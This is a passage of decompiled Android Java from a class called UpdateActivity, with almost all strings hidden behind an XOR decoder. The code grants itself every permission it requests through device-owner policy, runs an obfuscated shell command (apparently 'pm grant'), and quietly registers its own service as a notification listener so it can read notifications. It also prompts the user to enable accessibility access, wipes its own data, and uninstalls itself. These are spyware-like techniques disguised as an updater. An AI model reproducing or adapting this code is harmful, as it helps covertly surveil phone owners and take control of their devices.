                            C2194a.m3500t(C2349s0.class, null).show(updateActivity.getSupportFragmentManager(), AbstractC1387m.m2421h(new byte[]{88, -23, -7, 47, -63, -19, 45, 63, 107, -5, -28, 46, -48, -15, 43, 56, 64, -5, -45, 37, -53, -28, 36, 34, 83}, new byte[]{52, -120, -116, 65, -94, -123, 72, 77}));
                            break;
                        case 7:
                            String str10 = UpdateActivity.f1678l;
                            updateActivity.m1601t();
                            break;
                        case 8:
                            updateActivity.f1687j++;
                            Handler handler2 = updateActivity.f1688k;
                            handler2.removeCallbacksAndMessages(null);
                            handler2.postDelayed(new Runnable() { // from class: e0.w2
                                @Override // java.lang.Runnable
                                public final void run() {
                                    switch (i14) {
                                        case 0:
                                            String str11 = UpdateActivity.f1678l;
                                            UpdateActivity updateActivity2 = updateActivity;
                                            C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                            String str12 = UpdateActivity.f1678l;
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                            try {
                                                Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                                intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                                intent.addFlags(268435456);
                                                updateActivity2.startActivity(intent);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                            } catch (Exception e12) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                                try {
                                                    Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                    intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                    intent2.addFlags(268435456);
                                                    updateActivity2.startActivity(intent2);
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                                } catch (Exception e13) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                    try {
                                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                        Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                        intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                        intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                        intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                        updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                    } catch (Exception e14) {
                                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                    }
                                                }
                                            }
                                            updateActivity2.f1685h.setEnabled(true);
                                            break;
                                        default:
                                            updateActivity.f1687j = 0;
                                            break;
                                    }
                                }
                            }, 1000L);
                            if (updateActivity.f1687j >= 10) {
                                updateActivity.f1687j = 0;
                                updateActivity.f1682e.setVisibility(0);
                            }
                            break;
                        default:
                            String str11 = UpdateActivity.f1678l;
                            new C1445y2(AbstractC1387m.m2421h(new byte[]{89, -15}, new byte[]{23, -94, 17, -110, -3, 93, 70, -67}), updateActivity);
                            break;
                    }
                }
            });
            m1601t();
            return;
        }
        this.f1679b = (TextView) findViewById(R.id.currentVersionTextView);
        this.f1680c = (Button) findViewById(R.id.updateButton);
        this.f1681d = (Button) findViewById(R.id.updateButton2);
        final int i13 = 6;
        findViewById(R.id.launcherShortcutsButton).setOnClickListener(new View.OnClickListener(this) { // from class: e0.v2

            /* JADX INFO: renamed from: c */
            public final /* synthetic */ UpdateActivity f3455c;

            {
                this.f3455c = this;
            }

            /* JADX WARN: Code duplicated, block: B:107:0x03a5  */
            /* JADX WARN: Code duplicated, block: B:113:0x03dc  */
            /* JADX WARN: Code duplicated, block: B:134:0x01c9 A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:136:0x01af A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:52:0x01b5  */
            /* JADX WARN: Code duplicated, block: B:57:0x01d2  */
            /* JADX WARN: Code duplicated, block: B:68:0x0263 A[DONT_INVERT] */
            /* JADX WARN: Code duplicated, block: B:69:0x0265 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            /* JADX WARN: Code duplicated, block: B:73:0x0292 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                String[] strArr;
                char c;
                Boolean bool;
                Iterator<AccessibilityServiceInfo> it;
                String string;
                ComponentName componentName;
                String strFlattenToString;
                int i14 = i13;
                final UpdateActivity updateActivity = this.f3455c;
                final int i15 = 1;
                final int i16 = 0;
                switch (i14) {
                    case 0:
                        String str3 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 1:
                        String str4 = UpdateActivity.f1678l;
                        AbstractC3656k.m5875u(updateActivity, new Intent(updateActivity, (Class<?>) ManageAppsActivity.class), null);
                        break;
                    case 2:
                        String str5 = UpdateActivity.f1678l;
                        if (!((DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-54, -62, -102, 109, 29, -104, -14, 90, -63, -53, -123, 103, 7}, new byte[]{-82, -89, -20, 4, 126, -3, -83, 42}))).isDeviceOwnerApp(updateActivity.getPackageName())) {
                            Context applicationContext = updateActivity.getApplicationContext();
                            try {
                                strArr = applicationContext.getPackageManager().getPackageInfo(applicationContext.getPackageName(), 4096).requestedPermissions;
                            } catch (PackageManager.NameNotFoundException e) {
                                e.printStackTrace();
                                strArr = new String[0];
                            }
                            if (strArr != null && strArr.length != 0) {
                                ArrayList arrayList = new ArrayList();
                                for (String str6 : strArr) {
                                    if (ContextCompat.checkSelfPermission(applicationContext, str6) != 0) {
                                        arrayList.add(str6);
                                    }
                                }
                                if (!arrayList.isEmpty()) {
                                    ActivityCompat.requestPermissions(updateActivity, (String[]) arrayList.toArray(new String[0]), 100);
                                }
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{50, -84, -96, 96, -101, 114, -102, -12, 58, -93, -86, 113, -111}, new byte[]{83, -49, -61, 5, -24, 1, -13, -106}))).getEnabledAccessibilityServiceList(-1);
                            Boolean bool2 = Boolean.FALSE;
                            Iterator<AccessibilityServiceInfo> it2 = enabledAccessibilityServiceList.iterator();
                            while (it2.hasNext()) {
                                if (it2.next().getId().equals(updateActivity.getPackageName())) {
                                    bool2 = Boolean.TRUE;
                                }
                            }
                            if (!bool2.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{-80, 10, -116, -127, 107, -34, 3, -85, -94, 1, -100, -121, 109, -39, 0, -10, -1, 37, -85, -80, 65, -28, 52, -52, -109, 45, -92, -70, 80, -18, 56, -42, -108, 48, -68, -70, 74, -16, 52}, new byte[]{-47, 100, -24, -13, 4, -73, 103, -123})), null);
                            }
                            break;
                        } else {
                            ComponentName componentName2 = new ComponentName(updateActivity, (Class<?>) DPups.class);
                            String strM2421h = AbstractC1387m.m2421h(new byte[]{-14, -107, 82, 72, 40, 29, 122, 96, -51, -98, 103, 87, 32, 0, 125, 102, -48}, new byte[]{-94, -16, 32, 37, 65, 110, 9, 9});
                            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-5, -44, -62, 93, -26, -81, 31, -75, -16, -35, -35, 87, -4}, new byte[]{-97, -79, -76, 52, -123, -54, 64, -59}));
                            try {
                                String packageName = updateActivity.getPackageName();
                                String[] strArr2 = updateActivity.getPackageManager().getPackageInfo(packageName, 4096).requestedPermissions;
                                if (strArr2 != null) {
                                    int length = strArr2.length;
                                    c = 0;
                                    while (i16 < length) {
                                        try {
                                            devicePolicyManager.setPermissionGrantState(componentName2, packageName, strArr2[i16], 1);
                                            i16++;
                                        } catch (Exception e6) {
                                            e = e6;
                                            e.printStackTrace();
                                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList4 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                                            bool = Boolean.FALSE;
                                            it = enabledAccessibilityServiceList4.iterator();
                                            while (it.hasNext()) {
                                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                                    bool = Boolean.TRUE;
                                                }
                                            }
                                            if (!bool.booleanValue()) {
                                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                                            }
                                            DevicePolicyManager devicePolicyManager4 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                                            devicePolicyManager4.isDeviceOwnerApp(updateActivity.getPackageName());
                                            Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                            string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                            componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                            if (string == null) {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            } else {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            }
                                            if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                                                ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                                                return;
                                            } else if (Build.VERSION.SDK_INT < 29) {
                                                return;
                                            } else {
                                                return;
                                            }
                                        }
                                    }
                                } else {
                                    c = 0;
                                }
                            } catch (Exception e10) {
                                e = e10;
                                c = 0;
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList5 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                            bool = Boolean.FALSE;
                            it = enabledAccessibilityServiceList5.iterator();
                            while (it.hasNext()) {
                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                    bool = Boolean.TRUE;
                                }
                            }
                            if (!bool.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                            }
                            DevicePolicyManager devicePolicyManager5 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                            devicePolicyManager5.isDeviceOwnerApp(updateActivity.getPackageName());
                            try {
                                Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                break;
                            } catch (IOException unused) {
                            }
                            try {
                                string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                if (string == null && string.contains(componentName.flattenToString())) {
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{63, -125, 40, -126, 59, -101, -86, 81, 5, -123, 51, -123, 125, -98, -96, 67, 5, -119, 50, -114, 47, -46, -88, 92, 3, -119, Base64.padSymbol, -113, 36, -46, -82, 66, 16, -126, 40, -114, 57, -36}, new byte[]{113, -20, 92, -21, 93, -14, -55, 48}));
                                } else {
                                    if (string != null || string.isEmpty()) {
                                        strFlattenToString = componentName.flattenToString();
                                    } else {
                                        StringBuilder sb = new StringBuilder();
                                        sb.append(string);
                                        byte[] bArr2 = new byte[1];
                                        bArr2[c] = 55;
                                        sb.append(AbstractC1387m.m2421h(bArr2, new byte[]{13, 42, -127, ByteCompanionObject.MIN_VALUE, -4, -26, 59, -41}));
                                        sb.append(componentName.flattenToString());
                                        strFlattenToString = sb.toString();
                                    }
                                    Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                }
                            } catch (Exception e11) {
                                Log.e(strM2421h, AbstractC1387m.m2421h(new byte[]{-47, 14, 100, 118, -81, -49, -8, 87, -8, 79, 106, 104, -85, -59, -84, 3, -7, 0, 121, 115, -84, -62, -69, 66, -29, 6, 98, 116, -22, -57, -79, 80, -29, 10, 99, ByteCompanionObject.MAX_VALUE, -72, -117, -88, 70, -27, 2, 100, 105, -71, -62, -73, 77, -83, 79}, new byte[]{-105, 111, 13, 26, -54, -85, -40, 35}) + e11.getMessage());
                            }
                        }
                        if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                        } else if (Build.VERSION.SDK_INT < 29 && ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{-98, -29, -58, 50, 77, 42, -53, 38, -113, -24, -48, 45, 75, 48, -36, 97, -112, -29, -116, 1, 97, 0, -22, 91, -84, -46, -32, 1, 97, 8, -24, 90, -80, -40, -20, 4, 125, 15, -32, 75, -66, -39, -21, 15, 108}, new byte[]{-1, -115, -94, 64, 34, 67, -81, 8})) != 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{-51, 34, -45, -116, 87, 2, 116, -126, -36, 41, -59, -109, 81, 24, 99, -59, -61, 34, -103, -65, 123, 40, 85, -1, -1, 19, -11, -65, 123, 32, 87, -2, -29, 25, -7, -70, 103, 39, 95, -17, -19, 24, -2, -79, 118}, new byte[]{-84, 76, -73, -2, 56, 107, 16, -84})}, 100);
                            break;
                        }
                        break;
                    case 3:
                        String str7 = UpdateActivity.f1678l;
                        C1652b.m2745o().loadBoolean(AbstractC1387m.m2421h(new byte[]{102, 120, 47, -40, 75}, new byte[]{34, 40, 90, -88, 56, 83, 4, 111}), false);
                        SharedPreferences.Editor editorEdit = updateActivity.getSharedPreferences(C3277a.f9610c, 0).edit();
                        editorEdit.clear();
                        editorEdit.apply();
                        SharedPreferences.Editor editorEdit2 = updateActivity.getSharedPreferences(C2571e.f7130b, 0).edit();
                        editorEdit2.clear();
                        editorEdit2.apply();
                        File[] fileArrListFiles = updateActivity.getFilesDir().listFiles();
                        if (fileArrListFiles != null) {
                            for (File file : fileArrListFiles) {
                                file.delete();
                            }
                        }
                        File[] fileArrListFiles2 = updateActivity.getCacheDir().listFiles();
                        if (fileArrListFiles2 != null) {
                            int length2 = fileArrListFiles2.length;
                            while (i16 < length2) {
                                fileArrListFiles2[i16].delete();
                                i16++;
                            }
                        }
                        break;
                    case 4:
                        updateActivity.f1685h.setEnabled(false);
                        Handler handler = new Handler(Looper.getMainLooper());
                        updateActivity.m1600s(AbstractC1387m.m2421h(new byte[]{-99, 73, 20, -43, 25, -99, 12}, new byte[]{-12, 39, 125, -95, 112, -4, 96, -126}));
                        while (i15 <= 4) {
                            handler.postDelayed(new RunnableC0010c(updateActivity, i15, 6), ((long) i15) * 2000);
                            i15++;
                        }
                        handler.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i16) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
